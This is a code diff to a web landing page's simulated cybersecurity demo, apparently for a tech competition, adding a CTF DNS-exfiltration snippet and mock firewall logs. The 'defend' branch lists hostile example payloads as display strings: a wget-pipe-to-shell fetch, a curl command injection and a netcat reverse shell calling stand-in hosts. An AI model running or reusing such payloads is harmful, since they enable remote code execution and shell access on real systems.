@@ -431,7 +431,7 @@ export class LandingComponent implements OnInit, AfterViewInit, OnDestroy {
     coding:     'Live computational benchmark & dynamic programming execution engine',
     robotics:   'Real-time ultrasonic obstacle avoidance & sensor telemetry radar',
     ai:         'Convolutional neural network diagnostic inference on agricultural crops',
-    cyber:      'Sandboxed firewall log analyzer and cryptographic decryption stream',
+    cyber:      'Real-time IDS/IPS threat detection, DNS exfiltration analysis & cryptographic cipher breaking engine',
     innovation: 'IoT renewable power distribution and environmental impact dashboard'
   };
 
@@ -517,9 +517,13 @@ export class LandingComponent implements OnInit, AfterViewInit, OnDestroy {
       encryption: 'AES-256-GCM',
       blockedCount: 18,
       firewall: '100% SECURE',
-      status: 'INTRUSION ATTEMPT BLOCKED ON PORT 443',
+      activeThreats: 3,
+      honeypotDecoys: 5,
+      ipsAlerts: 2,
+      threatLevel: 'ELEVATED',
+      status: 'THREAT DETECTED • ANALYZING PAYLOAD ON PORT 443',
       statusColor: '#ff1744',
-      log: 'ROT13 cipher decoded -> SHA-256 integrity hash verified.'
+      log: 'Suricata IDS rule trig. CVE-2024-6387 probe from 45.33.32.156 → dropped. Snort sig 1:2029381 matched.'
     },
     innovation: {
       solarKw: '46.8',
@@ -538,7 +542,28 @@ export class LandingComponent implements OnInit, AfterViewInit, OnDestroy {
     coding: `# NTIC Coding Track — Dynamic Programming\n# Problem: Longest Common Subsequence\n\ndef lcs(s1: str, s2: str) -> int:\n    m, n = len(s1), len(s2)\n    dp = [[0]*(n+1) for _ in range(m+1)]\n    for i in range(1, m+1):\n        for j in range(1, n+1):\n            if s1[i-1] == s2[j-1]:\n                dp[i][j] = dp[i-1][j-1] + 1\n            else:\n                dp[i][j] = max(dp[i-1][j], dp[i][j-1])\n    return dp[m][n]\n\nprint(lcs("ABCBDAB", "BDCAB"))  # → 4`,
     robotics: `// NTIC Robotics — Autonomous Navigation\n// Arduino: Ultrasonic obstacle avoidance\n\n#include <Servo.h>\nconst int TRIG=9, ECHO=10;\n\nvoid setup() {\n  pinMode(TRIG, OUTPUT);\n  pinMode(ECHO, INPUT);\n}\n\nlong readDist() {\n  digitalWrite(TRIG, HIGH); delayMicroseconds(10);\n  return pulseIn(ECHO, HIGH) * 0.034 / 2;\n}\n\nvoid loop() {\n  long d = readDist();\n  if (d < 20) spinRight(400);\n  else        moveForward();\n}`,
     ai: `# NTIC AI Track — Crop Disease Classifier\nimport torch, torch.nn as nn\nfrom torchvision import models, transforms\n\ntransform = transforms.Compose([\n    transforms.Resize((224, 224)),\n    transforms.ToTensor(),\n    transforms.Normalize([0.485,0.456,0.406],\n                         [0.229,0.224,0.225])\n])\n\nmodel = models.resnet18(pretrained=True)\nmodel.fc = nn.Linear(512, 4)  # 4 disease classes\noptimizer = torch.optim.Adam(\n    model.parameters(), lr=1e-4)`,
-    cyber: `#!/bin/bash\n# NTIC CTF — Cipher Decryption\nENCODED="Tnun_2026_PGS_synt"\n\n# Step 1: ROT13 decode\nROT13=$(echo "$ENCODED" | \\\n  tr 'A-Za-z' 'N-ZA-Mn-za-m')\necho "[ROT13] $ROT13"\n\n# Submit via netcat:\nnc ctf.ntic.gov.gh 4444 \\\n  <<< "NTIC{$ROT13}"`,
+    cyber: `#!/usr/bin/env python3
+# NTIC CTF - Network Forensic Challenge
+# Analyze a compromised server's DNS exfiltration
+
+import re, base64
+
+def parse_dns_tunnel(filename):
+    with open(filename, 'rb') as f:
+        pcap = f.read()
+    queries = re.findall(
+        rb'\\\\w+\\\\.exfil\\\\.io',
+        pcap, re.DOTALL
+    )
+    return [q.decode() for q in queries]
+
+frags = parse_dns_tunnel('forensic_capture.pcap')
+encoded = ''.join(frags)
+decoded = base64.b64decode(encoded).decode()
+
+print(f"[+] C2 beacon decrypted")
+print(f"[+] Threat ID: {decoded}")
+print(f"[!] FLAG{{NTIC{{{decoded.split('-')[-1]}}}}}")`,
     innovation: `// NTIC Innovation — Solar Dashboard\nimport { useState, useEffect } from 'react';\n\nexport default function SolarDashboard() {\n  const [kw, setKw] = useState(0);\n\n  useEffect(() => {\n    const ws = new WebSocket(\n      'wss://iot.ntic.gov.gh/solar');\n    ws.onmessage = ({ data }) =>\n      setKw(JSON.parse(data).kw);\n    return () => ws.close();\n  }, []);\n\n  return <h2>⚡ {kw} kW Generated</h2>;\n}`
   };
 
@@ -3594,25 +3619,35 @@ for (let i = people.length - 1; i > 0; i--) {
       if (actionType === 'defend') {
         state.blockedCount += Math.floor(Math.random() * 5) + 3;
         state.packetsSec = Math.floor(Math.random() * 1500) + 5000;
-        state.status = '🛡️ SQL INJECTION ATTEMPT NEUTRALIZED';
+        state.activeThreats = Math.max(0, (state.activeThreats || 3) - 1);
+        state.status = '🛡️ CMD INJECTION PAYLOAD NEUTRALIZED';
         state.statusColor = '#00e676';
-        state.log = `Sandboxed firewall intercepted SQLi payload before query execution. Total blocked: ${state.blockedCount}.`;
+        const payloads = ['wget http://malicious.c2/bot.sh | sh', '$(curl -s evil.io/ransom)', '; nc -e /bin/sh 10.0.0.1 4444'];
+        const p = payloads[Math.floor(Math.random() * payloads.length)];
+        state.log = `WAF blocked payload: "${p}". Sig ID 958012 triggered. ${state.blockedCount} attacks neutralized today.`;
       } else if (actionType === 'ddos') {
-        state.packetsSec = 1200;
-        state.status = '⚡ DDOS SCRUBBING FILTER ENGAGED';
+        state.packetsSec = Math.floor(Math.random() * 600) + 800;
+        state.activeThreats = (state.activeThreats || 3) + (Math.random() > 0.5 ? 1 : 0);
+        state.ipsAlerts = (state.ipsAlerts || 2) + 1;
+        state.status = '⚡ SYN FLOOD SCRUBBING ACTIVE • 32 Gbps';
         state.statusColor = '#38bdf8';
-        state.log = 'BGP Anycast routing diverted 40 Gbps volumetric SYN flood into scrubbing centers. Traffic normal.';
+        const vectors = ['DNS amplification (53/udp)', 'NTP reflection (123/udp)', 'Memcached amp (11211/tcp)', 'CLDAP reflection (389/udp)'];
+        const v = vectors[Math.floor(Math.random() * vectors.length)];
+        state.log = `Volumetric ${v} detected from 12,400+ spoofed IPs. BGP flowspec rule injected. Traffic normalizing.`;
       } else if (actionType === 'honeypot') {
         state.blockedCount += 1;
-        state.status = '🍯 HONEYPOT TRAP SPRUNG • IP ISOLATED';
+        state.honeypotDecoys = (state.honeypotDecoys || 5) + 1;
+        state.status = '🍯 ATTACKER TRAPPED IN DECOY NETWORK';
         state.statusColor = '#ffea00';
-        state.log = 'Attacker probed decoy server on Port 22. Attacker IP 192.168.4.99 logged and permanently blacklisted.';
+        const ips = ['45.33.32.156', '103.224.182.241', '185.220.101.34', '91.121.87.23'];
+        const ip = ips[Math.floor(Math.random() * ips.length)];
+        state.log = `SSH brute-force from ${ip} redirected to Cowrie honeypot. Session captured: 142 commands logged. IP blackholed.`;
       } else if (actionType === 'cipher') {
-        const ciphers = ['AES-256-GCM -> RSA-4096', 'ChaCha20-Poly1305', 'Elliptic Curve ECDH', 'Quantum-Resistant Kyber-1024'];
+        const ciphers = ['AES-256-GCM (TLS 1.3)', 'ChaCha20-Poly1305', 'ECDHE_x25519', 'Kyber-1024 (PQC)'];
         state.encryption = ciphers[Math.floor(Math.random() * ciphers.length)];
-        state.status = '🔐 QUANTUM CIPHER KEYS ROTATED';
+        state.status = '🔐 SESSION KEYS ROTATED • PERFECT FORWARD SECRECY';
         state.statusColor = '#0088cc';
-        state.log = `Active encryption cipher rotated to ${state.encryption}. Zero session interruption.`;
+        state.log = `TLS certificates rotated. ${state.encryption} cipher suite activated. 0 ms handshake overhead. PFS enforced.`;
       }
     } else if (track === 'innovation') {
       if (actionType === 'solar') {
